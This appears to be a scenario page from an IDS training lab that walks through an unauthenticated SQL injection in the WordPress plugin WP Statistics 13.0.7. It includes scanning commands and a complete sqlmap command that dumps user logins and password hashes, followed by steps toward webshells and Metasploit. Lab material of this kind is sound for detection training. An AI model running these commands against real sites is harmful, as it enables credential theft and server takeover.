# WordPress Hack - Unauthenticated SQL Injection

**For educational purposes only!**

**Warning:** This scenario could trigger the IDS detections on your network.

### Setup
- Attacker-PC
  - VM or VPS accessing the IDS-Lab via IP address of Docker VM and ports exposed by Nginx container
- WordPress
  - docker container
  - installed wordpress (available at port 80 or 443 of nginx container)
  - installed and activated plugin [WP Statistics 13.0.7](https://downloads.wordpress.org/plugin/wp-statistics.13.0.7.zip). Hint:
```
wget https://downloads.wordpress.org/plugin/wp-statistics.13.0.7.zip
unzip wp-statistics.13.0.7.zip -d /var/lib/docker/volumes/ids-lab_wordpress/_data/wp-content/plugins/
```

### Scenario
- Attacker started with scanning. For example, he could use tools `nikto` and `wpscan`:
```
nikto -host http://<DockerVM>:80
wpscan --url http://<DockerVM>:80
```
- `wpscan` detects vulnerable version of plugin WP Statistics. It contains vulnerability 
[CVE-2021-24340](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24340/), an [unauthenticated SQL injection](https://wpscan.com/vulnerability/d2970cfb-0aa9-4516-9a4b-32971f41a19c/)
- leveraging the Proof of Concept from the previous website, the attacker can use `sqlmap` for dumping the user accounts and passwords from WordPress database
```
sqlmap -u "http://<DockerVM>:80/wp-admin/admin.php?page=wps_pages_page&ID=0&type=home" -p ID --dbms=MySQL -T wp_users -C user_login,user_pass --dump
```
  - *we assume that the attacker is familiar with WordPress and he already knows the table name and the desired columns. Otherwise, he could use `sqlmap` to dump the names of databases, tables and columns*
- later, the attacker could crack the WordPress admin's password and login to the WordPress Administration
- possible objectives:
  - accessing files on the webserver: plugin File Manager
  - accessing OS shell: plugin WP Terminal or arbitrary webshell from the Internet
  - all of the above + much more via Metasploit Meterpreter and `wp_admin_shell_upload`
